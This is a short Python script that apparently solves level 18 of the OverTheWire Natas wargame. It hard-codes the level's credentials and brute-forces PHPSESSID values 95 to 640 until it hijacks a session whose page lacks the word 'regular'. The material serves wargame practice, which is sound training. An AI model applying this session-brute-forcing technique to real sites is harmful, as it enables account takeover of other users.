#!/usr/bin/python3
# Time: 2019/04/22 8:18 PM


import re
import time
import requests
import base64


"""  
1. 暴力尝试　PHPSESSID 
2. 想了解登录信息, 先查查看 cookies
"""

username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
url = f'http://{username}.natas.labs.overthewire.org/'
s = requests.Session()

for i in range(95, 641):
    resp = s.post(url, auth=(username, password), data={"username": "please", "password": "subscribe"},  cookies={"PHPSESSID": str(i)})
    if "regular" not  in resp.text:
        print("this is the one !", i)
        print(resp.text)
    else:
        print("tring : ", i)



